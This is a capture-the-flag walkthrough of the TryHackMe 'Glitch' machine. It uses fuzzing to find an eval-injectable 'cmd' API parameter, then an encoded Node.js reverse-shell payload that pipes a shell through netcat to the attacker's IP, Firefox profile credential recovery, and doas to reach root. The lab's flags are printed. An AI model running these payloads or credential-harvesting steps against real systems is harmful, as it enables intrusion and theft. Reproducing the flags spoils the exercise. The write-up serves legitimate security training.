# Glitch - TryHackMe Walkthrough

## Machine Information

| Category         | Value            |
| ---------------- | ---------------- |
| Platform         | TryHackMe        |
| Machine Name     | Glitch           |
| Difficulty       | Easy             |
| Operating System | Linux            |
| Objective        | User + Root Flag |

---

# Reconnaissance

## Initial Nmap Scan

As always, we begin with a full TCP port scan to identify exposed services.

```bash
nmap -p- --min-rate 5000 -T4 10.48.170.19
```

### Results

```text
Nmap scan report for ip-10-48-170-19.ap-south-1.compute.internal (10.48.170.19)
Host is up (0.00033s latency).

Not shown: 65534 filtered tcp ports (no-response)

PORT   STATE SERVICE
80/tcp open  http
```

Only a single service is exposed on TCP port 80.

---

## Service Enumeration

Next, perform version detection.

```bash
nmap -sCV -p80 10.48.170.19
```

### Results

```text
Nmap scan report for ip-10-48-170-19.ap-south-1.compute.internal (10.48.170.19)

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)

|_http-title: not allowed
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.0 (Ubuntu)

Service Info: OS: Linux
```

### Observations

* Nginx 1.14.0
* Ubuntu backend
* Only GET, HEAD, POST and OPTIONS allowed
* Homepage displays "not allowed"

At this point, web enumeration becomes the primary attack path.

---

# Web Enumeration

Browsing to:

```text
http://10.48.170.19
```

reveals almost nothing except an image.

Whenever a page appears empty, inspect the source code.

---

## Page Source Analysis

Viewing source reveals:

```html
<script>
function getAccess() {
  fetch('/api/access')
    .then((response) => response.json())
    .then((response) => {
      console.log(response);
    });
}
</script>
```

Interesting.

The frontend is requesting data from:

```text
/api/access
```

Let's access it directly.

---

## API Access Endpoint

```http
GET /api/access HTTP/1.1
```

Response:

```json
{
  "token":"dGhpc19pc19ub3RfcmVhbA=="
}
```

The token looks like Base64.

Decode it:

```bash
echo dGhpc19pc19ub3RfcmVhbA== | base64 -d
```

Output:

```text
this_is_not_real
```

---

## Using the Token

Using the decoded token through the browser developer tools unlocks another page on the website.

This confirms the application is using client-side logic to gate access.

Once inside the new page, inspect source code again.

---

## Second JavaScript Endpoint

The new page contains:

```javascript
await fetch('/api/items')
.then((response) => response.json())
.then((response) => {
```

Another API endpoint appears.

Let's investigate.

---

# Enumerating /api/items

Request:

```http
GET /api/items HTTP/1.1
```

The response only contains a list of items.

Nothing immediately useful.

Burp Suite shows:

```text
304 Not Modified
```

for repeated requests.

Testing alternative methods is usually worthwhile.

---

## POST Request Discovery

Sending:

```http
POST /api/items HTTP/1.1
```

returns:

```json
{
  "message":"there_is_a_glitch_in_the_matrix"
}
```

This response is suspicious.

A hidden parameter or backend functionality likely exists.

---

# Parameter Discovery

Let's fuzz for hidden parameters.

```bash
ffuf -u http://10.48.170.19/api/items/?FUZZ=test \
-X POST \
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/api/objects.txt
```

---

## Fuzzing Results

```text
cmd [Status: 500, Size: 1081]
```

Interesting.

The parameter:

```text
cmd
```

causes a server-side error.

This is usually a strong indication that backend code attempted to process our input.

---

# Investigating cmd Parameter

Request:

```http
POST /api/items?cmd=test HTTP/1.1
```

Response contains:

```text
(/var/web/routes/api.js:25:60)
at router.post (/var/web/routes/api.js:25:60)
```

and a JavaScript stack trace.

---

## Key Observation

The error leaks:

```text
/var/web/routes/api.js
```

and suggests user input is being evaluated.

This often indicates:

```javascript
eval()
```

or similar dangerous code execution.

The presence of a parser error confirms our payload is being interpreted as JavaScript.

This means we likely have Remote Code Execution.

---

# Remote Code Execution

Start a listener.

```bash
nc -lvnp 4444
```

Payload:

```javascript
require("child_process").exec("rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20%2Di%202%3E%261%7Cnc%2010%2E9%2E0%2E38%204444%20%3E%2Ftmp%2Ff")
```

Send through Burp Repeater:

```http
POST /api/items?cmd=<PAYLOAD> HTTP/1.1
```

---

## Reverse Shell Obtained

Listener receives:

```text
Connection received on 10.48.170.19

/bin/sh: 0: can't access tty; job control turned off

$
```

Verify access.

```bash
whoami
```

Output:

```text
user
```

Initial foothold achieved.

---

# Stabilizing Shell

Spawn a proper TTY.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Background shell:

```bash
CTRL + Z
```

On attacker machine:

```bash
stty raw -echo
fg
```

Press Enter.

Then:

```bash
export TERM=xterm
```

We now have a fully interactive shell.

---

# User Flag

Navigate to the user's home directory.

```bash
cd ~
ls
```

Read flag.

```bash
cat user.txt
```

Output:

```text
THM{i_don't_know_why}
```

User flag captured.

---

# Privilege Escalation

## Initial Enumeration

Running standard enumeration reveals an interesting directory.

```bash
ls -la
```

Output includes:

```text
drwxrwxrwx   4 user user 4.0K Jan 27 2021 .firefox
```

A world-writable Firefox profile directory is unusual.

This immediately becomes our focus.

---

# Firefox Credential Harvesting

Inspect the directory.

```bash
cd ~/.firefox
find .
```

Firefox profiles often store:

```text
logins.json
key4.db
```

which may contain saved credentials.

---

## Extracting Browser Data

Copy the Firefox profile from the target machine to your attacking machine.

Example:

```bash
scp -r user@TARGET:~/.firefox .
```

or transfer using your preferred method.

---

## Offline Credential Recovery

After examining the Firefox profile locally, stored credentials can be recovered.

Recovered credentials:

```text
Username: v0id
Password: love_the_void
```

---

# Switching User

Use the recovered password.

```bash
su v0id
```

Password:

```text
love_the_void
```

Successful login.

Verify:

```bash
whoami
```

Output:

```text
v0id
```

---

# Root Access

Checking sudo permissions:

```bash
sudo -l
```

No useful results.

Continue enumerating.

Eventually discover:

```bash
doas -u root /bin/bash
```

Execute:

```bash
doas -u root /bin/bash
```

Immediate root shell obtained.

Verify:

```bash
whoami
```

Output:

```text
root
```

Root compromise complete.

---

# Root Flag

Read the root flag.

```bash
cat /root/root.txt
```

Output:

```text
THM{diamonds_break_our_aching_minds}
```

---

# Flags

## User

```text
THM{i_don't_know_why}
```

## Root

```text
THM{diamonds_break_our_aching_minds}
```

---

# Attack Path Summary

```text
Port 80 Enumeration
        │
        ▼
/api/access
        │
        ▼
Base64 Token Discovery
        │
        ▼
Hidden Page Access
        │
        ▼
/api/items
        │
        ▼
POST Request Testing
        │
        ▼
Hidden cmd Parameter
        │
        ▼
JavaScript Evaluation Vulnerability
        │
        ▼
NodeJS Remote Code Execution
        │
        ▼
Reverse Shell as user
        │
        ▼
Firefox Profile Enumeration
        │
        ▼
Recover Credentials
        │
        ▼
su v0id
        │
        ▼
doas -u root /bin/bash
        │
        ▼
Root Access
```

---

# Key Takeaways

### Web Application

* Always inspect page source.
* Hidden JavaScript endpoints often reveal functionality.
* API endpoints deserve direct testing.
* POST requests may expose behavior hidden from GET requests.
* Stack traces frequently disclose backend technology.

### Exploitation

* Fuzzing parameters can reveal undocumented functionality.
* JavaScript parser errors often indicate dangerous eval usage.
* NodeJS applications become critical when user input reaches eval().

### Privilege Escalation

* Browser profiles are treasure troves of credentials.
* Firefox stores recoverable login information.
* Credential reuse remains a common privilege escalation vector.
* Never ignore alternative privilege escalation tools such as doas.

```

Machine rooted successfully.
```
